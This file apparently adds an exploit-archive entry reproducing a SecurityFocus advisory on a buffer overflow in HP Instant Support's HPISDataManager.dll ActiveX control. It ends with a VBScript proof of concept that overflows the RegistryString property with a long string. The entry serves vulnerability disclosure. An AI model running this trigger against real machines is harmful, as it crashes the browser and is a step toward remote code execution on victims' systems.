@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/29534/info
+
+HP Instant Support 'HPISDataManager.dll' ActiveX control is prone to a remote buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied input.
+
+An attacker can exploit this issue to execute arbitrary code in the context of an application using the ActiveX control (typically Internet Explorer). Failed attacks will likely cause denial-of-service conditions.
+
+HP Instant Support 1.0.0.22 and earlier versions are affected.
+
+NOTE: This issue was previously covered in BID 29526 (HP Instant Support 'HPISDataManager.dll' ActiveX Control Unspecified Code Execution Vulnerabilities), but has been given its own record because of new information.
+
+<?XML version='1.0' standalone='yes' ?> <package><job id='DoneInVBS' debug='false' error='true'> <object classid='clsid:14C1B87C-3342-445F-9B5E-365FF330A3AC' id='target' /> <script language='vbscript'> 'for debugging/custom prolog targetFile = "C:\WINDOWS\Downloaded Program Files\HPISDataManager.dll" prototype = "Property Let RegistryString ( ByVal bstrRegistryKey As String , ByVal bUserKey As Long ) As String" memberName = "RegistryString" progid = "HPISDataManagerLib.Datamgr" argCount = 3 arg1=String(2068, "B") arg2=1 arg3="defaultV" target.RegistryString(arg1 ,arg2 ) = arg3 </script></job></package> 
